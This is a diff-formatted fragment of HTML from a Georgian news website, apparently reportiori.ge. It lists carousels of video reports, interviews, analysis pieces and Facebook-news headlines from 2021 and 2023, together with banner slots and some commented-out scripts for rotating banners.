+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('m1LnA9L2DUI');"><img src="uploads/news_153188.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('m1LnA9L2DUI');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-153188">კაცი, რომელსაც ლიტერატურა ძლიერ უყვარდა - ცად ამაღლდა!...</span>
+                  <!--<span id="big_title-153188" class="hover">კაცი, რომელსაც ლიტერატურა ძლიერ უყვარდა - ცად ამაღლდა!...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  15:49</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-153189">
+                    
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('Eb3mmMENFOg');"><img src="uploads/news_153189.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('Eb3mmMENFOg');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-153189">მდუმარე რეპორტაჟი ანზორ ერქომაიშვილის დაკრძალვიდან...</span>
+                  <!--<span id="big_title-153189" class="hover">მდუმარე რეპორტაჟი ანზორ ერქომაიშვილის დაკრძალვიდან...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  15:50</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-128719">
+                    
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('_ojxrC-gb9U');"><img src="uploads/news_128719.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('_ojxrC-gb9U');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-128719">სოხუმის სახელმწიფო უნივერსიტეტმა ლევან რატიანს უმასპინძლა...</span>
+                  <!--<span id="big_title-128719" class="hover">სოხუმის სახელმწიფო უნივერსიტეტმა ლევან რატიანს უმასპინძლა...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  17:01</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-116884">
+                    
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('7HKOdWzjZwM');"><img src="uploads/news_116884.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('7HKOdWzjZwM');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-116884">ბესო ჩუბინიძის წიგნის პრეზენტაცია გაიმართა...</span>
+                  <!--<span id="big_title-116884" class="hover">ბესო ჩუბინიძის წიგნის პრეზენტაცია გაიმართა...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  23:09</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-115833">
+                    
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('RzXRVSpX6zY');"><img src="uploads/news_115833.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('RzXRVSpX6zY');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-115833">„საქართველოს მქარგველთა და ხელმარჯვეების“ ასოციაციის წევრების ნამუშევრ...</span>
+                  <!--<span id="big_title-115833" class="hover">„საქართველოს მქარგველთა და ხელმარჯვეების“ ასოციაციის წევრების ნამუშევრების გამოფენა გაიმართა...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  22:06</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-112519">
+                    
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('AfzCGxZ37AQ');"><img src="uploads/news_112519.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('AfzCGxZ37AQ');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-112519">GERA ს ადვოკატის კახაბერ ასლანიშვილის განცხადება...</span>
+                  <!--<span id="big_title-112519" class="hover">GERA ს ადვოკატის კახაბერ ასლანიშვილის განცხადება...</span>-->
+                  <div class="rep_tvalit_date">4 მაისი, 2021,  13:16</div></a>
+               </li>
+               
+    
+                
+    
+    
+    
+              </ul>
+    
+              <script type="text/javascript">
+                  /*$(document).ready(function(){
+                    var id=$('.news_background').attr('id')[0];
+                      $("#"+id).mouseover(function(){
+                      alert(id);
+        
+                  })
+                  });*/
+               </script>
+    
+              <ul class="carousel_pages">
+    
+                <li class="prev" style="margin-left:-8px;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+              <a class="archive" href="index.php?menuid=75" style="margin:2px 4px 0 0;">არქივი</a> </div>
+    
+              </div>
+    
+            <div class="news_block_wrap" style="width:352px;margin-top:21px;float: right;"> <a href="index.php?menuid=97"><span class="category_mark left_sider" style="transform:none;right:53.2%;top:-22px;">ART - რეპორტიორი</span></a>
+    
+            <div class="jcarousel" style="width:352px" data-jcarousel="true">
+    
+              <ul class="news_block" style="left: 0px; top: 0px;">
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_168776.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          
+                  </div>
+                  <a class="rolling_info_news" onclick="video('');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">„ჩვენი საქართველო აქ არის"...</span>
+                  <!--<span id="big_title" class="hover">„ჩვენი საქართველო აქ არის"...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  16:45</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_168264.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          
+                  </div>
+                  <a class="rolling_info_news" onclick="video('');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">„ნაბიჯები" - ოსკაროსანი ფილმი, რომელიც 30 წუთში გადაიღეს და 4 წუთი გრძ...</span>
+                  <!--<span id="big_title" class="hover">„ნაბიჯები" - ოსკაროსანი ფილმი, რომელიც 30 წუთში გადაიღეს და 4 წუთი გრძელდება...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  14:18</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('6cmdd4FNFbk');"><img src="uploads/news_156872.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          
+                  </div>
+                  <a class="rolling_info_news" onclick="video('6cmdd4FNFbk');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">„უჩინმაჩინის ქუდი"...</span>
+                  <!--<span id="big_title" class="hover">„უჩინმაჩინის ქუდი"...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  15:34</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('7JhuihB3_Ic');"><img src="uploads/news_153468.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          <span class="video_mark" style="top:5px"></span>
+                  </div>
+                  <a class="rolling_info_news" onclick="video('7JhuihB3_Ic');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">ანსამბლი ბრავო მეტეხი - საქართველოს იავნანა...</span>
+                  <!--<span id="big_title" class="hover">ანსამბლი ბრავო მეტეხი - საქართველოს იავნანა...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  00:18</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('HG-VrmF53ME');"><img src="uploads/news_152867.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          <span class="video_mark" style="top:5px"></span>
+                  </div>
+                  <a class="rolling_info_news" onclick="video('HG-VrmF53ME');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">„ერთი რამის სიყვარული, დაფარვა რომ სჭირდება" - სატელევიზიო სპექტაკლი გ...</span>
+                  <!--<span id="big_title" class="hover">„ერთი რამის სიყვარული, დაფარვა რომ სჭირდება" - სატელევიზიო სპექტაკლი გურამ დოჩანაშვილის მოთხრობის მი...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  02:39</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('cYKolDqoHqk');"><img src="uploads/news_152843.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          <span class="video_mark" style="top:5px"></span>
+                  </div>
+                  <a class="rolling_info_news" onclick="video('cYKolDqoHqk');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">„კაცი, რომელსაც ლიტერატურა ძლიერ უყვარდა" - სპექტაკლი...</span>
+                  <!--<span id="big_title" class="hover">„კაცი, რომელსაც ლიტერატურა ძლიერ უყვარდა" - სპექტაკლი...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  18:59</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_137610.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          
+                  </div>
+                  <a class="rolling_info_news" onclick="video('');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">ნიკო ნადირაშვილი - „სიზმრის ზარები"...</span>
+                  <!--<span id="big_title" class="hover">ნიკო ნადირაშვილი - „სიზმრის ზარები"...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  01:08</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_134783.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          <span class="video_mark" style="top:5px"></span>
+                  </div>
+                  <a class="rolling_info_news" onclick="video('');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">ნოდარ ტურძელაძე და ღამის შოუ - „ჩემო თბილის ქალაქო"...</span>
+                  <!--<span id="big_title" class="hover">ნოდარ ტურძელაძე და ღამის შოუ - „ჩემო თბილის ქალაქო"...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  23:26</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_127964.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          <span class="video_mark" style="top:5px"></span>
+                  </div>
+                  <a class="rolling_info_news" onclick="video('');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">გოგა პიპინაშვილის „უცნობი მე"...</span>
+                  <!--<span id="big_title" class="hover">გოგა პიპინაშვილის „უცნობი მე"...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  22:08</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                  
+                      <a style="cursor:pointer;" onclick="video('3dwxM-ksaeI');"><img src="uploads/news_126602.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                          
+                          <span class="video_mark" style="top:5px"></span>
+                  </div>
+                  <a class="rolling_info_news" onclick="video('3dwxM-ksaeI');" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">კატო გიორგაძე გადაცემა „ავტოგრაფში“ - მუსიკა, ტექსტი: კ. გიორგაძე ...</span>
+                  <!--<span id="big_title" class="hover">კატო გიორგაძე გადაცემა „ავტოგრაფში“ - მუსიკა, ტექსტი: კ. გიორგაძე ...</span>-->
+                  <div class="rep_tvalit_date">28 სექტემბერი, 2021,  23:08</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                
+    
+              </ul>
+    
+               <ul class="carousel_pages">
+    
+                <li class="prev" style="margin-left:-8px;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+              <a class="archive" href="index.php?menuid=97" style="margin:2px 4px 0 0;">არქივი</a> </div>
+    
+              </div>
+    
+          </div>
+    
+        </div>
+    
+        
+    
+                    <div class="right_wing" style="margin-top:22px;">
+    
+    
+    
+    
+    
+    
+          <div class="highlite_news" style="border:1px solid #d6d6d6;padding:5px 4px;margin-top:-1px;"> <a href="index.php?menuid=74"><span class="category_mark right_sider">ინტერვიუ</span> </a> 
+        <div class="jcarousel" id="highlite_carousel1" style="height:251px;width:282px;margin-bottom:0px;" data-jcarouselautoscroll="true" data-jcarousel="true">
+    
+        <ul class="carousel_wrap" style="left: -564px; top: 0px;">
+    
+              
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=74&amp;id=208499"><img src="uploads/news_208499.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=74&amp;id=208499" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> თამაზ გაიაშვილი პრეზიდენტს: უმადურობა უდიდესი ცოდვაა!...</a>
+    
+              </li>
+             
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=74&amp;id=208488"><img src="uploads/news_208488.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=74&amp;id=208488" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> მერაბ ჭიქაშვილი: ვიზების გაუქმებისა და ფრენების აღდგენის საკ...</a>
+    
+              </li>
+             
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=74&amp;id=207917"><img src="uploads/news_207917.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=74&amp;id=207917" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> დავით ქართველიშვილი: ტრამპის ბოლო განცხადება რომ მოვისმინე, ...</a>
+    
+              </li>
+             
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=74&amp;id=207675"><img src="uploads/news_207675.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=74&amp;id=207675" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> იგორ კვესელავა: არ არის გამორიცხული, ჯო ბაიდენს, უკრაინის მო...</a>
+    
+              </li>
+             
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=74&amp;id=207602"><img src="uploads/news_207602.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=74&amp;id=207602" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> ზაზა პაპუაშვილი: როგორ შეიძლება, კორუფციაში ჩაფლულმა ევროპარ...</a>
+    
+              </li>
+              
+    
+          </ul>
+    
+          <ul class="carousel_pages" style="margin-top: 0px;">
+    
+                <li class="prev" style="margin-left: -5px; display: inline-block;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true" style="display: inline-block;"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+          <a class="archive" href="index.php?menuid=74" style="margin-top:1px;">არქივი</a> 
+    
+    
+    
+      </div>
+    </div>
+    
+    
+    
+    <a class="right_banner" href=""><img src="uploads/banner_164.png?w=290&amp;h=126" width="290" height="126" alt="right_banner">
+    </a>
+    
+    
+    
+    
+    
+              <!--   <a href="https://cesko.ge/" target="_blank">
+                  <div style="padding:0px; margin:0px; overflow:hidden; cursor:pointer; width:250px; height:100px">
+                    <iframe src="https://ads.clp.ge/clp-banners/websites/banners/cesko/250x100/index.html"  style="pointer-events: none; width:100% !important; height: 100px"></iframe>
+                  </div>
+                </a> -->
+       
+    
+    
+    
+           <div class="highlite_news" style="border: solid 1px #D6D6D6; padding:4px;margin-top: 21px;"> <a href="index.php?menuid=48"><span class="category_mark right_sider">ანალიტიკა / პუბლიცისტიკა</span> </a>
+    
+           <div class="jcarousel" id="highlite_carousel2" style="height:251px;width:282px;margin-bottom:0px;" data-jcarouselautoscroll="true" data-jcarousel="true">
+    
+        <ul class="carousel_wrap" style="left: -564px; top: 0px;">
+    
+              
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=48&amp;id=208073"><img src="uploads/news_208073.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=48&amp;id=208073" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> აღარ  წაშავდა?!...</a>
+    
+              </li>
+             
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=48&amp;id=207480"><img src="uploads/news_207480.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=48&amp;id=207480" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> კეთილგონიერებით გასავლელი  (ციკლიდან „რა სურს ამერიკას?!“ - ...</a>
+    
+              </li>
+             
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=48&amp;id=206430"><img src="uploads/news_206430.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=48&amp;id=206430" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> ნუგზარ ფოფხაძე: რეზო ლაღიძეს და მის ერთ-ერთ შედევრს - „ჰიმნი...</a>
+    
+              </li>
+             
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=48&amp;id=206396"><img src="uploads/news_206396.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=48&amp;id=206396" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> ნუგზარ ფოფხაძე: და დადგა დღე, როცა თბილისი დაამშვენა „დედა ე...</a>
+    
+              </li>
+             
+    
+    
+    
+              <li class="highlite_news" style="display: inline-block;"> 
+    
+                   
+                        <div style="margin-bottom: 3px;">
+              <a href="inside.php?menuid=48&amp;id=206259"><img src="uploads/news_206259.jpg?w=282&amp;h=187" width="282" height="187" alt="highlited_news">
+    </a>
+              </div>
+                <a href="inside.php?menuid=48&amp;id=206259" style="color:#ff0000;height:35px;margin-bottom:5px;overflow:hidden;display:block;font-size: 14px;"> საქართველოს ჟურნალისტთა კავშირს გიორგი მამაცაშვილი უხელმძღვა...</a>
+    
+              </li>
+              
+    
+          </ul>
+    
+          <ul class="carousel_pages" style="margin-top: 0px;">
+    
+                <li class="prev" style="margin-left: -5px; display: inline-block;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true" style="display: inline-block;"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+          <a class="archive" href="index.php?menuid=48" style="margin-top:1px;">არქივი</a> 
+      </div>
+              
+        </div>
+    
+    
+    <!-- <div class="four_news_wrap" style="width:292px;margin-top:20px;"> <a href="index.php?polls"><span class="category_mark left_sider" style="transform:none;right: 63%;top:-21px;" >გამოკითხვა</span></a>
+    
+         <div id="question" style="height:330px;">
+        
+            <div id="gam">
+                            <button name="subgamokitxva" id="question_submit">ხმის მიცემა</button>
+                <div id="all_count">სულ 16510 ხმა</div>
+            </div>
+    
+    
+            
+        
+    
+            <div id="results">
+    
+            </div>
+        </div>
+    </div> -->
+    
+    
+              
+    
+              <a class="right_banner" href="https://www.facebook.com/EklesiisMshenebloba/"><img src="uploads/banner_156.jpg?w=292&amp;h=352" width="292" height="352" alt="right_banner">
+    </a>
+            
+    
+           <div class="highlite_news banner_1_7" style="border:1px solid #d6d6d6;padding:7px 4px;margin-top:21px; ">
+    
+              <span class="category_mark right_sider"> "რეპორტიორი" წარმოგიდგენთ </span>
+    
+              
+                                  
+    
+              
+              <a class="right_banner" href=""><img src="uploads/banner_99.png?w=282&amp;h=142" width="282" height="142" alt="right_banner">
+    </a>
+              <a class="right_banner" href=""><img src="uploads/banner_100.png?w=282&amp;h=142" width="282" height="142" alt="right_banner">
+    </a>
+              <a class="right_banner" href=""><img src="uploads/banner_100.png?w=282&amp;h=141" width="282" height="141" alt="right_banner">
+    </a>
+              
+    
+          </div>
+    
+                     
+             <!--  <a class="right_banner" target = "_blank" href=""><img src="uploads/banner_97.png?w=292&h=352" width="292" height="352" alt="right_banner" />
+    </a> -->
+             
+             
+    
+    </div>
+    
+    
+    
+    
+    <script type="text/javascript" src="../js/gamokitxva.js"></script>    
+    
+    
+    
+        
+    
+     
+      
+      
+        <ul class="big_banners" style="margin-top:0px;margin-bottom:2px">
+    
+          <li><a href="" target="_blank"><img src="uploads/banner_166.png?w=1012&amp;h=110" width="1012" height="110" alt="big_banner">
+    </a></li>
+    
+        </ul>
+    
+    
+        
+    
+        
+    
+    
+    
+        </div>
+    
+       <a href="https://reportiori.ge/" target="_blank">
+          <div class="transparent"></div>
+        </a>
+    
+    
+        <!-- <script>
+                $( document ).ready(function() {
+                  var links = ["https://www.facebook.com/GOGLICHIDZEGIORGI",
+                               "https://www.facebook.com/ZAURDARGALI",
+                               "https://www.facebook.com/BERIDZEVAKHTANG",
+                               "https://www.facebook.com/MODEBADZEGIVI",
+                               "https://www.facebook.com/GDGIORGISHENGELIA",
+                               "https://www.facebook.com/KAKHADZELADO"
+                               ];      
+    
+                  var banners = ["http://reportiori.ge/img/41/b/1.png",
+                                 "http://reportiori.ge/img/41/b/2.png",
+                                 "http://reportiori.ge/img/41/b/3.png",
+                                 "http://reportiori.ge/img/41/b/4.png",
+                                 "http://reportiori.ge/img/41/b/5.png",
+                                 "http://reportiori.ge/img/41/b/6.png"
+                                 ];             
+    
+                    var x = Math.floor((Math.random() * 7));
+                      var lnk = links[x];
+                      var img = banners[x];
+                      $('#banner_link_b').attr("href", lnk);
+                      $('#banner_image_b').attr("src", img);
+    
+                    setInterval(function(){
+                      var x = Math.floor((Math.random() * 7));
+                      var lnk = links[x];
+                      var img = banners[x];
+                      $('#banner_link_b').attr("href", lnk);
+                      $('#banner_image_b').attr("src", img);
+                    }, 5000);
+    
+                  });
+                </script>
+    
+        <div class="transparent">
+          <a  target="_blank" id="banner_link_b">
+            <img itemprop="image" id="banner_image_b" style="height: 300px; width: 1028px; ">
+    
+          </a>
+        </div> -->
+    
+        <div class="content">
+    
+    
+      
+     
+      
+      
+        <ul class="big_banners" style="margin-top:0px;margin-bottom:8px">
+    
+          <li><a href="" target="_blank"><img src="uploads/banner_167.png?w=1012&amp;h=110" width="1012" height="110" alt="big_banner">
+    </a></li>
+    
+        </ul>
+    
+       <div class="left_wing">
+    
+          <div class="four_news_wrap" style="margin-top:21px; margin-right: 8px;padding: 0px 3px; width: 344px;"> <a href="index.php?menuid=101"><span class="category_mark left_sider" style="transform:none;right:58.3%;top:-22px;">FACEBOOK - NEWS</span></a>
+    
+      <div class="jcarousel" style="margin-bottom:0px;" data-jcarousel="true">
+    
+          <ul class="news_block" style="height: 199px; left: 0px; top: 0px;">
+    
+               
+    
+            <li style="margin-right: 4px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208509" style="cursor:pointer;"><img src="uploads/news_208509.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208509" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ზურაბ ქადაგიძე:10 წელიწადში უმუშევართა რიცხვი საქართველოში 324 00...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  19:50</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208503" style="cursor:pointer;"><img src="uploads/news_208503.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208503" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              სვიმონ ჯანგულაშვილი: რუსეთი ჰონორარებს ალა პუგაჩოვასა და კირილ სე...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  17:57</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208486" style="cursor:pointer;"><img src="uploads/news_208486.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208486" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ვატო შაქარიშვილი: საინტერესოა, თუ თავიდან ბოლომდე, ამერიკის ინტერ...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  14:31</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208484" style="cursor:pointer;"><img src="uploads/news_208484.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208484" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              გიგლა ბარამიძე: ფადი ასლი საქართველოს შიდა და გარე მტრების ნატვრა...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  14:16</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208481" style="cursor:pointer;"><img src="uploads/news_208481.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208481" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              გია აბაშიძე: საქართველოში უმუშევრების რაოდენობა 21-ე საუკუნის ახა...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  13:55</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4px">
+                  
